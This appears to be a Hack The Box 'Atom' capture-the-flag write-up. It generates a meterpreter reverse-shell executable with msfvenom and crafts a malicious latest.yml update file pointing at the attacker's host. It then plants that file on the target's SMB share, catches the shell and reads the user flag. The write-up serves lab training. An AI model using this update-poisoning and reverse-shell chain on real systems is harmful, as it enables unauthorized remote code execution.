### 1.POC-

![[Pasted image 20210614141530.png]]

![[Pasted image 20210614143512.png]]

### 2.Using MsfVenom to build our payload-

```bash
root@napster:~/Documents/HTB/Atom# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.163 LPORT=9001 -f exe -o "r'napster.exe"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: r'napster.exe
root@napster:~/Documents/HTB/Atom# ls
 Atom   nmap  "r'napster.exe"   UAT_Testing_Procedures.pdf
root@napster:~/Documents/HTB/Atom# shasum -a 512 "r'napster.exe" | cut -d " " -f1 | xxd -r -p | base64 -w 0
S6SSVewwGaV+JY5k8wChfbQaHtQ4WQoIgfDvNDRvK7xAAjklsW3mzCB2ZcS/IFerwP9nTBFkjakSJGSHAm0TEQ==
```

### 3.Msfconsole-
```bash
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.163
LHOST => 10.10.14.163
msf6 exploit(multi/handler) > set LPORT 9001
LPORT => 9001
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.163:9001 
```

** Now we need to `create` a file called `latest.yml` and add our `hash` inside this file.**
### 4.latest.yml:

```bash
version: 1.2.3
path: http://10.10.14.163/r'napster.exe
sha512: S6SSVewwGaV+JY5k8wChfbQaHtQ4WQoIgfDvNDRvK7xAAjklsW3mzCB2ZcS/IFerwP9nTBFkjakSJGSHAm0TEQ==
```

```bash
root@napster:~/Documents/HTB/Atom# cat latest.yml 
version: 1.2.3
path: http://10.10.14.163/r'napster.exe
sha512: S6SSVewwGaV+JY5k8wChfbQaHtQ4WQoIgfDvNDRvK7xAAjklsW3mzCB2ZcS/IFerwP9nTBFkjakSJGSHAm0TEQ==
```

### 5.Put the latest.yml file inside client1:

Now last `thing` you want to do is put the file inside `client2` or client1 folder it's your `choice`.

```bash
root@napster:~/Documents/HTB/Atom# smbclient \\\\10.10.10.237\\Software_Updates
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jun 14 15:00:01 2021
  ..                                  D        0  Mon Jun 14 15:00:01 2021
  client1                             D        0  Mon Jun 14 15:00:01 2021
  client2                             D        0  Mon Jun 14 15:00:01 2021
  client3                             D        0  Mon Jun 14 15:00:01 2021
  UAT_Testing_Procedures.pdf          A    35202  Fri Apr  9 07:18:08 2021

                4413951 blocks of size 4096. 1368575 blocks available
smb: \> cd client1
smb: \client1\> put latest.yml 
putting file latest.yml as \client1\latest.yml (0.3 kb/s) (average 0.3 kb/s)
```

Start a python server and catch your reverse shell-

![[Pasted image 20210614150417.png]]

### 6.User.txt:

```bash
C:\Users\jason\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9793-C2E6

 Directory of C:\Users\jason\Desktop

04/02/2021  10:29 PM    <DIR>          .
04/02/2021  10:29 PM    <DIR>          ..
03/31/2021  02:09 AM             2,353 heedv1.lnk
03/31/2021  02:09 AM             2,353 heedv2.lnk
03/31/2021  02:09 AM             2,353 heedv3.lnk
06/14/2021  09:52 AM                34 user.txt
               4 File(s)          7,093 bytes
               2 Dir(s)   5,604,515,840 bytes free

C:\Users\jason\Desktop>type user.txt
type user.txt
44bcc7c69eb4ab08e9ad4d0591e770c1
```

